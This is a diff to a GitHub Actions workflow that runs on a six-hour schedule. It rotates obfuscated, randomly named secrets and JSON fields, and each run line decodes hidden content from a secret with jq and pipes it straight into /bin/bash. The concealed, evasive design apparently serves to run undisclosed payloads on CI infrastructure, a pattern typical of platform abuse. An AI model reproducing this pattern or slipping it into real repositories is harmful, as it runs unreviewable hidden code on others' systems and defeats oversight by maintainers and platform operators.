@@ -3,7 +3,7 @@ name: shangdongpeng4637
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
+    - cron: '38 1/6 * * *'
 
 jobs:
   build:
@@ -13,18 +13,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: shangdongpeng4637
         env:
-          bz1: ${{ secrets.bz1 }}
+          yod4: ${{ secrets.yod4 }}
         run: |
-          echo $bz1 | jq -r .i8559 | /bin/bash
-          echo $o08 | jq -r .p03020 | /bin/bash
-          echo $frtdc15679 | jq -r .itnrt96 | /bin/bash
-          echo $t08 | jq -r .zqx8619 | /bin/bash
-          echo $dbuof1223 | jq -r .sgjm9 | /bin/bash
-          echo $pg3992 | jq -r .saa4 | /bin/bash
-          echo $edy551 | jq -r .g76 | /bin/bash
-          echo $fbar3611 | jq -r .yx466 | /bin/bash
-          echo $if44897 | jq -r .thom32146 | /bin/bash
-          echo $jkfl951 | jq -r .pm9513 | /bin/bash
-          echo $jli2510 | jq -r .ayjm451 | /bin/bash
-          echo $tg703 | jq -r .hlww96886 | /bin/bash
+          echo $yod4 | jq -r .c2437 | /bin/bash
+          echo $gl654 | jq -r .by6954 | /bin/bash
+          echo $pfij9409 | jq -r .gvnhx129 | /bin/bash
+          echo $zkh0 | jq -r .inke4324 | /bin/bash
+          echo $uadfe92 | jq -r .e48 | /bin/bash
 
